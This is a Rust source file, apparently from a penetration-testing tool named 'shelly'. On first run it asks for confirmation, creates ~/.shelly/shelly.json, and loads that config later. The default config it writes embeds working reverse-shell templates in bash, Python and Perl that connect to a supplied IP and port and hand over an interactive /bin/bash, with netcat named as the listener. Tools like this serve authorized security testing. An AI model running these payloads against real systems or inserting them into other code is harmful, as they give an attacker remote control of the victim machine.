use std::fs;
use std::io::{self, Write};
use std::path::PathBuf;
use dirs::home_dir;

pub fn ensure_exists() -> io::Result<()> {
    let home = home_dir().expect("Could not determine home directory");
    let mut shelly_dir = PathBuf::from(&home);
    shelly_dir.push(".shelly");

    let mut abort = false;

    // Create directory if missing (recursively, but it's just one component)
    if !shelly_dir.exists() {
        if ask_yes_no("Looks like this is your first time running shelly. Init config file (~/.shelly/shelly.json)"){
            fs::create_dir_all(&shelly_dir)?;
        } else {
           println!("Exiting, cannot continue without config file");
           abort = true;
        }
        
    }

    let mut shelly_file = shelly_dir.clone();
    shelly_file.push("shelly.json");

    if !shelly_file.exists() && !abort{
        let mut file = fs::File::create(&shelly_file)?;
        let default_config = r#"{
    "shelly": {
        "default_http_svr": 8000
    },
    "toolbox": {},
    "shells": {
        "bash": {
            "listener": "netcat",
            "templates": [
                "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
                "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
                "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
            ]
        }
    }
}"#;
        file.write_all(default_config.as_bytes())?;
    }

    Ok(())
}

pub fn load_config() -> json::JsonValue {
    let home = home_dir().expect("Could not determine home directory");
    let shelly_config = PathBuf::from(&home).join(".shelly").join("shelly.json");
    let json_content = fs::read_to_string(shelly_config).expect("Unable to read file");
    let parsed = json::parse(&json_content).unwrap();
    parsed
}



fn ask_yes_no(prompt: &str) -> bool {
    loop {
        print!("{} (y/n): ", prompt);
        io::stdout().flush().expect("flush failed");
        let mut input = String::new();
        if io::stdin().read_line(&mut input).is_err() {
            println!("Failed to read input. Try again.");
            continue;
        }
        match input.trim().to_lowercase().as_str() {
            "y" | "yes" => return true,
            "n" | "no" => return false,
            _ => {
                println!("Please enter 'y' or 'n'.");
            }
        }
    }
}